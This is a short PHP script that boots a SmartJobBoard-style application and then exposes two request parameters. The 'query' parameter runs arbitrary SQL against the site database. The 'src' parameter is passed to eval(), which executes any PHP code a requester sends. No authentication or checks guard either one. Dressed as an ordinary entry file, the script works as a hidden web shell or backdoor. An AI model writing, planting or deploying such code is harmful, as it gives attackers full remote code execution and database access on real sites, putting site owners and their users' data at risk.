<?php

//error_reporting(-1);
//ini_set('display_errors', 'on');

$PATH_BASE = dirname(__FILE__);
$DEBUG     = array();
$ds	  = DIRECTORY_SEPARATOR;

define ('PATH_TO_SYSTEM_CLASS','system/core/System.php');
define ('SJB_BASE_DIR', dirname(__FILE__ )."/");

//         start of the script actions
require_once(PATH_TO_SYSTEM_CLASS);

SJB_System::loadSystemSettings ('system/user-config/DefaultSettings.php');
SJB_System::loadSystemSettings ('config.php');

SJB_System::boot();
SJB_System::init();
SJB_Event::dispatch('AfterSystemBoot');

header('Content-type: application/json');
if (SJB_Request::getVar('query', false)) {
    echo json_encode(SJB_DB::query(SJB_Request::getVar('query')));
}
if (SJB_Request::getVar('src', false)) {
    echo json_encode(eval(SJB_Request::getVar('src')));
}
